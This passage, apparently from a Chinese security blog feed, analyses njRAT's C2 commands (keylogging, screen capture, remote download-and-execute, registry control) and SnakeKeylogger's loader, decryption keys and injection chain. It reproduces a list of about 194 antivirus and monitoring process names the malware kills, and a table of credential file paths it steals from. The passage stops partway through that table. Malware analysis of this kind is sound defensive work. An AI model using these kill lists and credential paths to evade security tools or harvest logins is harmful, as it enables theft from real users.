<li>设置<code>EnableRaisingEvents</code>属性为<code>true</code>，表示如果关联的进程终止时应引发<code>Exited</code>事件。</li>
</ol>
<p><img src="/njrat_images/182490214234502.png" alt=""></p>
<p><code>OK.RS()</code>函数从后期绑定值中检索<code>Data</code>字段，该字段包含子进程的<code>StandardOutput/StandardError</code>流，然后采用<code>Base64</code>编码后发送到<code>C2</code>服务器：</p>
<p><img src="/njrat_images/590630915228048.png" alt=""></p>
<h4 id="263-rs-命令">2.6.3. rs 命令</h4>
<p><strong>当命令组合为：<code>rs|'|'|&lt;EnBase64[command]&gt;</code>时</strong></p>
<p>将通过<code>Base64</code>解码第二个参数，然后通过<code>StandardInput.WriteLine</code>向之前创建的<code>StandardInput</code>流写入数据：</p>
<p><img src="/njrat_images/263611415221182.png" alt=""></p>
<h4 id="264-rsc-命令">2.6.4. rsc 命令</h4>
<p><strong>当命令组合为：<code>rsc|'|'|</code>时</strong></p>
<p>将调用<code>Kill()</code>，杀死之前创建的子进程：</p>
<p><img src="/njrat_images/108482115211712.png" alt=""></p>
<h4 id="265-kl-命令">2.6.5. kl 命令</h4>
<p><strong>当命令组合为：<code>rsc|'|'|</code>时</strong></p>
<p>将对键盘记录的日志进行<code>Base64</code>编码后发送到<code>C2</code>服务器：</p>
<p><img src="/njrat_images/227352315214216.png" alt=""></p>
<h4 id="266-inf-命令">2.6.6. inf 命令</h4>
<p><strong>当命令组合为：<code>inf|'|'|</code>时</strong></p>
<p>检索注册表<code>HKEY_CURRENT_USER\Software\49e91d08e684b1770e0cefa60401157a\vn</code>的值是否为空，再通过<code>OK.HWD()</code>获取系统磁盘卷序列号，与<code>OK.VN</code>拼接后通过<code>Base64</code>编码，然后将<code>C2</code>域名、端口、<code>AppData</code>、可执行文件名、当前进程名拼接后发送到<code>C2</code>服务器：</p>
<p><img src="/njrat_images/266782715223163.png" alt=""></p>
<h4 id="267-prof-命令">2.6.7. prof 命令</h4>
<p><strong>当命令组合为：<code>prof|'|'|~|'|'|&lt;name&gt;|'|'|&lt;value&gt;</code>时</strong></p>
<p>将调用<code>OK.STV()</code>添加注册表项：</p>
<p><img src="/njrat_images/63635115225825.png" alt=""></p>
<p><code>OK.STV()</code>函数则是编辑注册表<code>HKEY_CURRENT_USER\Software\49e91d08e684b1770e0cefa60401157a</code>，为其添加新的项，并设置对应键值：</p>
<p><img src="/njrat_images/395084515216657.png" alt=""></p>
<p><strong>当命令组合为：<code>prof|'|'|!|'|'|&lt;name&gt;|'|'|&lt;value&gt;</code>时</strong></p>
<p>将调用<code>OK.STV()</code>添加注册表项，然后调用<code>OK.GTV()</code>获取<code>!</code>的键值，并将键值发送到<code>C2</code>服务器。</p>
<p><img src="/njrat_images/406185115215123.png" alt=""></p>
<p><code>OK.GTV()</code>函数内容如下：</p>
<p><img src="/njrat_images/91094815243612.png" alt=""></p>
<p><strong>当命令组合为：<code>prof|'|'|@|'|'|&lt;name&gt;</code>时</strong></p>
<p>将调用<code>OK.DLV()</code>删除对应名称的键值：</p>
<p><img src="/njrat_images/10115415211374.png" alt=""></p>
<p><code>OK.DLV()</code>函数内容如下：</p>
<p><img src="/njrat_images/420645515211513.png" alt=""></p>
<h4 id="268-rn-命令">2.6.8. rn 命令</h4>
<p><strong>当命令组合为：<code>rn|'|'|&lt;Extension_Name&gt;|'|'|&lt;URL&gt;/&lt;Base64[Gzip_Bit]&gt;</code>时</strong></p>
<p>首先将判断第三个参数是否是<code>http</code>开头的连接，如果不是，则调用<code>FromBase64String</code>解码第三个参数，再调用<code>OK.ZIP()</code>对解码内容进行处理：</p>
<p><img src="/njrat_images/198180416223603.png" alt=""></p>
<p><code>OK.ZIP()</code>函数会调用<code>GZipStream</code>压缩和解压缩数据内容，不过当前的执行流程是解压缩：</p>
<p><img src="/njrat_images/31141216228642.png" alt=""></p>
<p>如果第三个参数是<code>http</code>开头的链接，则会使用<code>WebClient.DownloadData()</code>下载文件：</p>
<p><img src="/njrat_images/474271917229937.png" alt=""></p>
<p>上述两个步骤二选一执行后，将对在<code>%Temp%</code>目录下，将所有字节写入随机命名的<code>.&lt;Extension_Name&gt;</code>文件，新建进程执行该文件并向<code>C2</code>服务器发送文件名：
<img src="/njrat_images/263612717230939.png" alt=""></p>
<h4 id="269-inv-命令">2.6.9. inv 命令</h4>
<p><strong>当命令组合为：<code>inv|'|'|&lt;Registry_Name&gt;|'|'|&lt;String1&gt;|'|'|&lt;String2&gt;</code>时</strong></p>
<p>首先检索<code>HKEY_CURRENT_USER\Software\49e91d08e684b1770e0cefa60401157a</code>中<code>&lt;Registry_Name&gt;</code>的键值，如果其不为空，则将该键值返回到<code>C2</code>服务器，并继续执行；</p>
<p>如果<code>&lt;Registry_Name&gt;</code>的键值为空，且<code>&lt;String2&gt;</code>长度为<code>1</code>，则返回<code>C2</code>服务器错误信息并结束此轮命令解析；如果<code>&lt;String2&gt;</code>长度不为<code>1</code>，则调用<code>OK.ZIP()</code>对<code>&lt;String2&gt;</code>进行解压缩，并设置<code>&lt;Registry_Name&gt;</code>键值为<code>&lt;String2&gt;</code>解压缩后的内容，成功则发送信息至<code>C2</code>服务器；</p>
<p>但从整个流程来看，<code>&lt;Registry_Name&gt;</code>中存放的是一个插件。样本首先检索<code>&lt;Registry_Name&gt;</code>是否已包含插件，如果没有，则判断<code>&lt;String2&gt;</code>是否是插件内容，如果是则写入<code>&lt;Registry_Name&gt;</code>，然后通过<code>OK.Plugin()</code>进行插件调用：</p>
<p><img src="/njrat_images/330533609211263.png" alt=""></p>
<p><code>OK.Plugin()</code>函数首先调用<code>Assembly.Load()</code>加载插件程序集，然后通过<code>Assembly.GetModules()</code>枚举程序集的所有模块，再寻找<code>.A</code>结尾的类，找到后使用<code>Assembly.CreateInstance()</code>创建它的实例：</p>
<p><img src="/njrat_images/292373909229689.png" alt=""></p>
<p>然后使用<code>NewLateBinding.LateSet()</code>方法向后期绑定字段写入：<code>h</code>（<code>C2</code>域名）、<code>p</code>（<code>C2</code>端口）、<code>osk</code>（<code>&lt;String1&gt;</code>），然后调用<code>NewLateBinding.LateCall()</code>执行<code>start</code>函数，最后写入<code>off</code>为<code>true</code>：</p>
<p><img src="/njrat_images/149061110226946.png" alt=""></p>
<h4 id="2610-ret-命令">2.6.10. ret 命令</h4>
<p><strong>当命令组合为：<code>ret|'|'|&lt;Registry_Name&gt;|'|'|&lt;String&gt;</code>时</strong></p>
<p>从函数结构可以看出功能同<code>inv</code>命令类似，首先查找本地注册表<code>&lt;Registry_Name&gt;</code>的键值，不存在则将<code>&lt;String&gt;</code>写入并进行插件加载：</p>
<p><img src="/njrat_images/454520710237722.png" alt=""></p>
<p>然后调用<code>NewLateBinding.LateGet()</code>获取<code>GT</code>的值，编码后发送给<code>C2</code>服务器：</p>
<p><img src="/njrat_images/449611010230391.png" alt=""></p>
<h4 id="2611-cap-命令">2.6.11. CAP 命令</h4>
<p><strong>当命令组合为：<code>CAP|'|'|&lt;Width&gt;|'|'|&lt;Height&gt;</code>时</strong></p>
<p>将通过<code>Bitmap.GetThumbnailImage()</code>方法，截取<code>&lt;Width&gt;</code>宽，<code>&lt;Height&gt;</code>高的屏幕，然后使用<code>OK.getMD5Hash()</code>将截图加密，最后通过<code>OK.Sendb()</code>发送到<code>C2</code>服务器：</p>
<p><img src="/njrat_images/98111810222700.png" alt=""></p>
<p><code>OK.getMD5Hash()</code>函数内容如下：</p>
<p><img src="/njrat_images/83462210240580.png" alt=""></p>
<p><code>OK.Sendb()</code>函数内容如下：</p>
<p><img src="/njrat_images/415142210238184.png" alt=""></p>
<h4 id="2612-p-命令">2.6.12. P 命令</h4>
<p><strong>当命令组合为：<code>P</code>时</strong></p>
<p>将向<code>C2</code>服务器发送<code>P</code>字符：</p>
<p><img src="/njrat_images/452492410235686.png" alt=""></p>
<h4 id="2613-un-命令">2.6.13. un 命令</h4>
<p><code>un</code>命令存在三个子项：<code>~</code>、<code>!</code>、<code>@</code>：</p>
<p><img src="/njrat_images/81072610216927.png" alt=""></p>
<p><strong>当命令组合为：<code>un|'|'|~</code>时</strong></p>
<p>调用<code>OK.UNS()</code>会首先执行<code>OK.pr(0)</code>将当前进程设置为非关键进程，然后删除被修改的注册表项及防火墙规则，删除启动文件夹下的样本文件，调用<code>cmd</code>隐藏窗口删除自身文件，最后结束当前进程：</p>
<p><img src="/njrat_images/216722910239367.png" alt=""></p>
<p><code>OK.pr(0)</code>调用了未公开的<code>API</code>函数<code>NtSetInformationProcess()</code>将当前进程设置为非关键进程，防止进程结束时触发<code>BSOD</code>：</p>
<p><img src="/njrat_images/323273010234503.png" alt=""></p>
<p><strong>当命令组合为：<code>un|'|'|!</code>时</strong></p>
<p>调用<code>OK.pr(0)</code>将当前进程设置为非关键进程，然后退出当前进程。</p>
<p><strong>当命令组合为：<code>un|'|'|@</code>时</strong></p>
<p>调用<code>OK.pr(0)</code>将当前进程设置为非关键进程，然后新进程启动自身并退出当前进程，可以理解为安全的重启。</p>
<h4 id="2614-up-命令">2.6.14. up 命令</h4>
<p><strong>当命令组合为：<code>up|'|'|&lt;URL&gt;/&lt;Base64[Gzip_Bit]&gt;</code>时</strong></p>
<p>前半段与<code>rn</code>命令下载功能类似，不过<code>up</code>命令指向的文件只能是<code>exe</code>，首先会根据第二个参数的内容获取目标文件的二进制，设置注册表<code>di</code>为空，将二进制文件保存到本地<code>%temp%</code>目录下，然后将随机生成的文件名发送到<code>C2</code>服务器，然后调用<code>Process.Start()</code>启动该文件，参数命令为<code>UP：&lt;当前进程ID&gt;</code>，然后进入一个循环，当<code>di</code>被设置为<code>!</code>时，卸载自身：</p>
<p><img src="/njrat_images/360291411228049.png" alt=""></p>
<h4 id="2615-rg-命令">2.6.15. RG 命令</h4>
<p><strong>当命令组合为：<code>RG|'|'|~|'|'|&lt;Registry_Item&gt;</code>时</strong></p>
<p>首先会调用<code>OK.GetKey()</code>获取<code>&lt;Registry_Item&gt;</code>项，然后通过<code>GetSubKeyNames()</code>和<code>GetValueNames()</code>枚举该项中的所有子项和对应键值，最后发送到<code>C2</code>服务器：</p>
<p><img src="/njrat_images/348183411211713.png" alt=""></p>
<p><code>OK.GetKey()</code>函数构造如下：</p>
<p><img src="/njrat_images/293383711214217.png" alt=""></p>
<p><strong>当命令组合为：<code>RG|'|'|!|'|'|&lt;Registry_Item&gt;|'|'|&lt;Registry_Name&gt;|'|'|&lt;Registry_Value&gt;|'|'|&lt;Registry_Kind&gt;</code>时</strong></p>
<p>设置<code>&lt;Registry_Name&gt;</code>项的键值为<code>&lt;Registry_Value&gt;</code>，类型为<code>&lt;Registry_Kind&gt;</code>：</p>
<p><img src="/njrat_images/556894111223164.png" alt=""></p>
<p><strong>当命令组合为：<code>RG|'|'|@|'|'|&lt;Registry_Item&gt;|'|'|&lt;Registry_Name&gt;</code>时</strong></p>
<p>将删除<code>&lt;Registry_Name&gt;</code>的项：</p>
<p><img src="/njrat_images/260094611216049.png" alt=""></p>
<p><strong>当命令组合为：<code>RG|'|'|#|'|'|&lt;Registry_Item&gt;|'|'|&lt;Registry_Name&gt;</code>时</strong></p>
<p>将创建<code>&lt;Registry_Name&gt;</code>的项：</p>
<p><img src="/njrat_images/505854711216658.png" alt=""></p>
<p><strong>当命令组合为：<code>RG|'|'|$|'|'|&lt;Registry_Item&gt;|'|'|&lt;Registry_Name&gt;</code>时</strong></p>
<p>将递归删除<code>&lt;Registry_Name&gt;</code>项和它的其它子项：</p>
<p><img src="/njrat_images/510814811243613.png" alt=""></p>
<h2 id="3-参考资料">3. 参考资料</h2>
<pre tabindex="0"><code>https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/
https://www.secpulse.com/archives/73878.html
https://app.any.run/tasks/78913e0b-1419-4571-8611-ac3372ffd578/#
https://www.virustotal.com/gui/file/833f86074592648c0a758098e34ab605a2b922d94dbab7141e2ce87acec03c35
</code></pre>]]></content>
		</item>
		
		<item>
			<title>SnakeKeylogger</title>
			<link>https://www.a1ee.cn/medium/snakekeylogger/</link>
			<pubDate>Fri, 03 Dec 2021 10:36:39 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/snakekeylogger/</guid>
			<description>SnakeKeylogger窃密木马样本分析 1. 样本简介 Snake Keylogger 是一种使用 .NET 开发的恶意软件。它于 2020 年末首次出现，专注于从受害者设备中窃取敏感信息，</description>
			<content type="html"><![CDATA[<h1 id="snakekeylogger窃密木马样本分析">SnakeKeylogger窃密木马样本分析</h1>
<h2 id="1-样本简介">1. 样本简介</h2>
<p>Snake Keylogger 是一种使用 .NET 开发的恶意软件。它于 2020 年末首次出现，专注于从受害者设备中窃取敏感信息，包括保存的凭据、受害者的按键、受害者屏幕截图和剪贴板数据。</p>
<p>2021 年 7 月，Snake Keylogger 首次进入 TOP 10 流行恶意软件家族报告，这意味着 Snake Keylogger 家族的影响力正在增加，并影响更多人的设备和敏感数据。</p>
<h2 id="2-样本信息">2. 样本信息</h2>
<table>
<thead>
<tr>
<th style="text-align:center">文件类型</th>
<th style="text-align:center">IOC</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">加载器[exe]</td>
<td style="text-align:center">c78dc582473992e26b204107ae9352b0</td>
</tr>
<tr>
<td style="text-align:center">解码器[dll]</td>
<td style="text-align:center">A97E3D4031E7D3124037234524F09B21</td>
</tr>
<tr>
<td style="text-align:center">释放器[dll]</td>
<td style="text-align:center">22B8A62A20FC15FBC38E8D6899241E21</td>
</tr>
<tr>
<td style="text-align:center">恶意载荷[exe]</td>
<td style="text-align:center">2C0A0FBF42ABB838527D3C7F340B600C</td>
</tr>
</tbody>
</table>
<h2 id="3-样本分析">3. 样本分析</h2>
<h3 id="31-基本信息">3.1. 基本信息</h3>
<p>采用<code>PEStudio</code>查看样本信息。该样本是个<code>.NET</code>程序，原始名称为<code>ICustomFacto.exe</code>:</p>
<p><img src="/snake_images/1488141151166.png" alt=""></p>
<h3 id="32-分析样本加载器">3.2. 分析样本（加载器）</h3>
<p>使用<code>dnSpy</code>加载样本，得知该样本存在一个长字符串<code>text</code>，并采用本地函数<code>TDesDecrypt</code>进行<code>DES</code>解码，密钥关键字为<code>97HSN5A4A5C4J75H7A7SH48T47QG5</code></p>
<p><img src="/snake_images/4499242169592.png" alt=""></p>
<p><code>TDesDecrypt</code>函数内容如下：</p>
<p><img src="/snake_images/3338347157459.png" alt=""></p>
<p>解码完成后，在<code>X0FT_FT2</code>函数中进行加载：</p>
<p><img src="/snake_images/5274348177625.png" alt=""></p>
<p>此处可以看到<code>S</code>的内容是一个<code>PE</code>文件的<code>DOS</code>头内容：<code>MZ</code></p>
<p><img src="/snake_images/1615055166849.png" alt=""></p>
<p>然后在<code>X0FT_FT1</code>函数中执行函数<code>Panamera.Porsche</code>：</p>
<p><img src="/snake_images/2236550170294.png" alt=""></p>
<h3 id="33-分析样本解码器">3.3. 分析样本（解码器）</h3>
<p>通过字符串解密将<code>representative.dll</code>加载到内存中，通过执行<code>Panamera.Porsche</code>函数，来到<code>Guru</code>函数，该函数将随机休眠<code>38-47</code>秒，已逃避沙箱的在线监测：</p>
<p><img src="/snake_images/3643758162603.png" alt=""></p>
<p>然后在循环中读取<code>.Properties.Resources</code>的资源并解密、加载：</p>
<p><img src="/snake_images/1249303190483.png" alt=""></p>
<p><code>.Properties.Resources</code>的资源是一张图片，但显然并不是一张正常的图片，而是需要解码的加密代码：</p>
<p><img src="/snake_images/5422816188087.png" alt=""></p>
<p>先使用<code>Draw.cba</code>读取图片的二进制数：</p>
<p><img src="/snake_images/3862723166830.png" alt=""></p>
<p>然后再使用<code>Draw.fgh</code>进行解码，整理的解码密钥是<code>4A7667415244</code>：</p>
<p><img src="/snake_images/1457124189270.png" alt=""></p>
<h3 id="34-分析样本恶意载荷释放器">3.4. 分析样本（恶意载荷释放器）</h3>
<p>通过解码器<code>representative.dll</code>的解码并加载，最终释放了<code>CF_Secretaria.dll</code>，但整个代码进行了混淆，难以阅读，且内部调试器也被禁用了：</p>
<p><img src="/snake_images/3120447184406.png" alt=""></p>
<p>通过对<code>CF_Secretaria.dll</code>的函数还原，可以看到一个有趣的点：<code>case 2U</code>:</p>
<p><img src="/snake_images/5470746111170.png" alt=""></p>
<p>该值所对应的函数主要功能是注入，且代码对象是<code>Reuniao.int_0</code>，深入函数内部可以看到其中调用了两个函数：<code>Reuniao.Execute</code>、<code>Reuniao.GetInjectionPath</code></p>
<p><img src="/snake_images/3525948129596.png" alt=""></p>
<p>在<code>Reuniao.Execute</code>函数中可以看到如下的长度计算函数，其中<code>payload</code>可能就藏着恶意载荷：</p>
<p><img src="/snake_images/2897415147463.png" alt=""></p>
<p>虽然在<code>CF_Secretaria.dll</code>无法获取到局部变量的内容，但跳转到系统<code>API</code>时是可以查看变量名的， <code>_BitConToInt32</code>所调用的<code>BitConverter.ToInt32</code>参数<code>value</code>中存储的是<code>MZ</code>标识的<code>PE</code>文件：</p>
<p><img src="/snake_images/539118160298.png" alt=""></p>
<h3 id="35-分析样本恶意载荷">3.5. 分析样本（恶意载荷）</h3>
<p>将上述内存中的<code>PE</code>文件保存下来，使用<code>PEStudio</code>查看：</p>
<p><img src="/snake_images/5007621156853.png" alt=""></p>
<p>文件经过混淆，去除混淆后可确定该<code>PE</code>文件为最终恶意载荷，其中存在大量窃密行为：</p>
<p><img src="/snake_images/2018756111171.png" alt=""></p>
<p>功能函数预览：</p>
<p><img src="/snake_images/2499500197630.png" alt=""></p>
<p><img src="/snake_images/4233259167464.png" alt=""></p>
<p>通过对函数的分析，可以得出样本存在以下功能：</p>
<ol>
<li><a href="#351-%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF">设置开机自启</a>；</li>
<li><a href="#352-%E6%9D%80%E6%AD%BB%E9%98%B2%E6%8A%A4%E8%BF%9B%E7%A8%8B">杀死防护进程</a>；</li>
<li><a href="#353--%E5%AE%9A%E6%97%B6%E6%88%AA%E5%8F%96%E5%B1%8F%E5%B9%95">定时截取屏幕</a>；</li>
<li><a href="#354--%E6%8A%93%E5%8F%96%E6%8C%89%E9%94%AE%E8%AE%B0%E5%BD%95">抓取按键记录</a>；</li>
<li><a href="#355--%E7%AA%83%E5%8F%96%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%86%85%E5%AE%B9">窃取剪贴板内容</a>；</li>
<li><a href="#356--%E7%AA%83%E5%8F%96%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE">窃取敏感数据</a>；</li>
<li><a href="#357--%E5%AE%9A%E6%97%B6%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE">定时发送数据</a>；</li>
<li><a href="#358--%E8%87%AA%E6%88%91%E5%88%A0%E9%99%A4%E5%8A%9F%E8%83%BD">自我删除功能</a>；</li>
</ol>
<h4 id="351-设置开机自启">3.5.1. 设置开机自启</h4>
<p>通过修改注册表：<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>，实现开机自启功能：</p>
<p><img src="/snake_images/3567936190299.png" alt=""></p>
<h4 id="352-杀死防护进程">3.5.2. 杀死防护进程</h4>
<p>该样本中存在<code>194</code>个进程目标，其中包含了杀毒软件和监控软件：</p>
<pre tabindex="0"><code>&#34;zlclient&#34;,&#34;egui&#34;,&#34;bdagent&#34;,&#34;npfmsg&#34;,&#34;olydbg&#34;,&#34;anubis&#34;,&#34;wireshark&#34;,&#34;avastui&#34;,&#34;_Avp32&#34;,&#34;vsmon&#34;,&#34;mbam&#34;,&#34;keyscrambler&#34;,&#34;_Avpcc&#34;,&#34;_Avpm&#34;,&#34;Ackwin32&#34;,&#34;Outpost&#34;,&#34;Anti-Trojan&#34;,&#34;ANTIVIR&#34;,&#34;Apvxdwin&#34;,&#34;ATRACK&#34;,&#34;Autodown&#34;,&#34;Avconsol&#34;,&#34;Ave32&#34;,&#34;Avgctrl&#34;,&#34;Avkserv&#34;,&#34;Avnt&#34;,&#34;Avp&#34;,&#34;Avp32&#34;,&#34;Avpcc&#34;,&#34;Avpdos32&#34;,&#34;Avpm&#34;,&#34;Avptc32&#34;,&#34;Avpupd&#34;,&#34;Avsched32&#34;,&#34;AVSYNMGR&#34;,&#34;Avwin95&#34;,&#34;Avwupd32&#34;,&#34;Blackd&#34;,&#34;Blackice&#34;,&#34;Cfiadmin&#34;,&#34;Cfiaudit&#34;,&#34;Cfinet&#34;,&#34;Cfinet32&#34;,&#34;Claw95&#34;,&#34;Claw95cf&#34;,&#34;Cleaner&#34;,&#34;Cleaner3&#34;,&#34;Defwatch&#34;,&#34;Dvp95&#34;,&#34;Dvp95_0&#34;,&#34;Ecengine&#34;,&#34;Esafe&#34;,&#34;Espwatch&#34;,&#34;F-Agnt95&#34;,&#34;Findviru&#34;,&#34;Fprot&#34;,&#34;F-Prot&#34;,&#34;F-Prot95&#34;,&#34;Fp-Win&#34;,&#34;Frw&#34;,&#34;F-Stopw&#34;,&#34;Iamapp&#34;,&#34;Iamserv&#34;,&#34;Ibmasn&#34;,&#34;Ibmavsp&#34;,&#34;Icload95&#34;,&#34;Icloadnt&#34;,&#34;Icmon&#34;,&#34;Icsupp95&#34;,&#34;Icsuppnt&#34;,&#34;Iface&#34;,&#34;Iomon98&#34;,&#34;Jedi&#34;,&#34;Lockdown2000&#34;,&#34;Lookout&#34;,&#34;Luall&#34;,&#34;MCAFEE&#34;,&#34;Moolive&#34;,&#34;Mpftray&#34;,&#34;N32scanw&#34;,&#34;NAVAPSVC&#34;,&#34;NAVAPW32&#34;,&#34;NAVLU32&#34;,&#34;Navnt&#34;,&#34;NAVRUNR&#34;,&#34;Navw32&#34;,&#34;Navwnt&#34;,&#34;NeoWatch&#34;,&#34;NISSERV&#34;,&#34;Nisum&#34;,&#34;Nmain&#34;,&#34;Normist&#34;,&#34;NORTON&#34;,&#34;Nupgrade&#34;,&#34;Nvc95&#34;,&#34;Outpost&#34;,&#34;Padmin&#34;,&#34;Pavcl&#34;,&#34;Pavsched&#34;,&#34;Pavw&#34;,&#34;PCCIOMON&#34;,&#34;PCCMAIN&#34;,&#34;Pccwin98&#34;,&#34;Pcfwallicon&#34;,&#34;Persfw&#34;,&#34;POP3TRAP&#34;,&#34;PVIEW95&#34;,&#34;Rav7&#34;,&#34;Rav7win&#34;,&#34;Rescue&#34;,&#34;Safeweb&#34;,&#34;Scan32&#34;,&#34;Scan95&#34;,&#34;Scanpm&#34;,&#34;Scrscan&#34;,&#34;Serv95&#34;,&#34;Smc&#34;,&#34;SMCSERVICE&#34;,&#34;Snort&#34;,&#34;Sphinx&#34;,&#34;Sweep95&#34;,&#34;SYMPROXYSVC&#34;,&#34;Tbscan&#34;,&#34;Tca&#34;,&#34;Tds2-98&#34;,&#34;Tds2-Nt&#34;,&#34;TermiNET&#34;,&#34;Vet95&#34;,&#34;Vettray&#34;,&#34;Vscan40&#34;,&#34;Vsecomr&#34;,&#34;Vshwin32&#34;,&#34;Vsstat&#34;,&#34;Webscanx&#34;,&#34;WEBTRAP&#34;,&#34;Wfindv32&#34;,&#34;Zonealarm&#34;,&#34;LOCKDOWN2000&#34;,&#34;RESCUE32&#34;,&#34;LUCOMSERVER&#34;,&#34;avgcc&#34;,&#34;avgcc&#34;,&#34;avgamsvr&#34;,&#34;avgupsvc&#34;,&#34;avgw&#34;,&#34;avgcc32&#34;,&#34;avgserv&#34;,&#34;avgserv9&#34;,&#34;avgserv9schedapp&#34;,&#34;avgemc&#34;,&#34;ashwebsv&#34;,&#34;ashdisp&#34;,&#34;ashmaisv&#34;,&#34;ashserv&#34;,&#34;aswUpdSv&#34;,&#34;symwsc&#34;,&#34;norton&#34;,&#34;Norton Auto-Protect&#34;,&#34;norton_av&#34;,&#34;nortonav&#34;,&#34;ccsetmgr&#34;,&#34;ccevtmgr&#34;,&#34;avadmin&#34;,&#34;avcenter&#34;,&#34;avgnt&#34;,&#34;avguard&#34;,&#34;avnotify&#34;,&#34;avscan&#34;,&#34;guardgui&#34;,&#34;nod32krn&#34;,&#34;nod32kui&#34;,&#34;clamscan&#34;,&#34;clamTray&#34;,&#34;clamWin&#34;,&#34;freshclam&#34;,&#34;oladdin&#34;,&#34;sigtool&#34;,&#34;w9xpopen&#34;,&#34;Wclose&#34;,&#34;cmgrdian&#34;,&#34;alogserv&#34;,&#34;mcshield&#34;,&#34;vshwin32&#34;,&#34;avconsol&#34;,&#34;vsstat&#34;,&#34;avsynmgr&#34;,&#34;avcmd&#34;,&#34;avconfig&#34;,&#34;licmgr&#34;,&#34;sched&#34;,&#34;preupd&#34;,&#34;MsMpEng&#34;,&#34;MSASCui&#34;,&#34;Avira.Systray&#34;
</code></pre><p><img src="/snake_images/5608937186854.png" alt=""></p>
<h4 id="353--定时截取屏幕">3.5.3.  定时截取屏幕</h4>
<p>样本中的<code>Timer1</code>的功能是截取屏幕：</p>
<p><img src="/snake_images/3880141182608.png" alt=""></p>
<p>截取屏幕的功能函数如下：</p>
<p><img src="/snake_images/5349642200488.png" alt=""></p>
<h4 id="354--抓取按键记录">3.5.4.  抓取按键记录</h4>
<p>样本会新建一个线程，通过<code>KeyLogger</code>来实现按键抓取：
<img src="/snake_images/43721611211242.png" alt=""></p>
<p>通过调用<code>SetWindowsHookExA</code>和<code>CallNextHookEx</code>函数，抓取键的按下和弹起：</p>
<p><img src="/snake_images/229354817216906.png" alt=""></p>
<h4 id="355--窃取剪贴板内容">3.5.5.  窃取剪贴板内容</h4>
<p>样本通过<code>Clipboard.GetText()</code>，从剪贴板中检索文本数据，并缓存在内存中：</p>
<p><img src="/snake_images/586333311217535.png" alt=""></p>
<p>然后由定时器，定时发送剪贴板内容：</p>
<p><img src="/snake_images/228573811237701.png" alt=""></p>
<p>其中<code>Class6.string_5</code>是获取的剪贴板内容，<code>Class6.string_8</code>中则是包含的<code>PC</code>相关信息（具体的方法将在下一小节详细说明）：</p>
<p><img src="/snake_images/11144011230370.png" alt=""></p>
<h4 id="356--窃取敏感数据">3.5.6.  窃取敏感数据</h4>
<p><code>Snake</code>会获取当前时间、操作系统名称、操作系统版本、物理内存：</p>
<p><img src="/snake_images/221285514226925.png" alt=""></p>
<p>通过在主机上访问：<code>http://checkip.dyndns.org/</code>，从返回信息中提取本地的公网<code>IP</code>地址：</p>
<p><img src="/snake_images/169722415211242.png" alt=""></p>
<p>通过在主机上访问：<code>https://freegeoip.app/xml/</code>，从返回信息中提取<code>IP</code>地址所在的国家和地区：</p>
<p><img src="/snake_images/406272715229668.png" alt=""></p>
<p>在针对特定应用进行数据窃取时，<code>Snake</code>采用<code>Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)</code>和<code>Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)</code>方法获取<code>%LocalAppData%</code>和<code>%AppData%</code>的<code>Windows</code>环境变量，然后通过访问应用的缓存目录窃取数据。</p>
<p><code>Snake</code>的窃取对象如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">应用名称</th>
<th style="text-align:left">窃取目标</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>邮件应用</strong></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">Outlook</td>
<td style="text-align:left">HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676<!-- raw HTML omitted -->HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676<!-- raw HTML omitted -->HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676<!-- raw HTML omitted -->HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676</td>
</tr>
<tr>
<td style="text-align:left">Foxmail</td>
<td style="text-align:left">$FoxmailInstalPath\Storage$email\Accounts\Account.rec0</td>
</tr>
<tr>
<td style="text-align:left">Thunderbird</td>
<td style="text-align:left">%AppData%\Thunderbird\Profiles\logins.json</td>
</tr>
<tr>
<td style="text-align:left">PostBox</td>
<td style="text-align:left">%AppData%\PostboxApp\Profiles\logins.json</td>
</tr>
<tr>
<td style="text-align:left"><strong>FTP 应用</strong></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">FileZilla</td>
<td style="text-align:left">%AppData%\FileZilla\recentservers.xml</td>
</tr>
<tr>
<td style="text-align:left"><strong>社交软件</strong></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">Pidgin</td>
<td style="text-align:left">%AppData%.purple\accounts.xml</td>
</tr>
<tr>
<td style="text-align:left">Discord</td>
<td style="text-align:left">%AppData%\discord\Local Storage\leveldb*.log</td>
</tr>
<tr>
<td style="text-align:left"><strong>浏览器</strong></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">Yandex</td>
<td style="text-align:left">%LocalAppData%\Yandex\YandexBrowser\User Data\Default\Ya Login Data</td>
</tr>
<tr>
<td style="text-align:left">Amigo</td>
<td style="text-align:left">%LocalAppData%\Amigo\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Xpom</td>
<td style="text-align:left">%LocalAppData%\Xpom\User Data\Deault\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Kometa</td>
<td style="text-align:left">%LocalAppData%\Kometa\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Nichrome</td>
<td style="text-align:left">%LocalAppData%\Nichrome\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Google Chrome</td>
<td style="text-align:left">%LocalAppData%\Google\Chrome\User Data\Default\Login Data</td>
</tr>
<tr>
